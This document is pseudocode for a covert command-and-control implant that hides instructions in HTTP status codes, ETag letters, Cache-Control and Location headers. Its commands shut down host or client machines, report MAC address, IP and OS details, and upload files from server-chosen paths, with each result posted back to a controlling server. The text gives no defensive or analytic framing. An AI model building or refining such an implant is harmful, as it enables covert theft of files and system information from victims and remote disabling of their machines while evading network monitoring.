start socket

send get request to let server know connection was made

listen for command

parse commands:


if packet is '204 No Content' 
    check first letter in etag
    if h, then target = host
    elif c, then target = client

    extract Cache-Control: max-age={delay}
    shutdown target in {delay} seconds (if 0 then immediate)

    send post
        if target = host, send post with body of text as "1:{delay}"
        elif target = client, send post with body of text as "2:{delay}"

if packet is '304 Not Modified'
    check first letter in etag
    if m, then data = mac
    elif i, then data = ip
    elif o, then data = OS info
    extract target data
    send post
        if data = mac, send post with body as "3:{extracted_mac}"
        elif data = ip, send post with body as "4:{extracted_ip}"
        elif data = os, send post with body as "5:{extracted_os_info}"
        
if packet is '301 Moved Permanently'
    extract file_location from Location: {file_location}
    upload file located at file_location
    send post
        send post with body as "6:{file_location}"
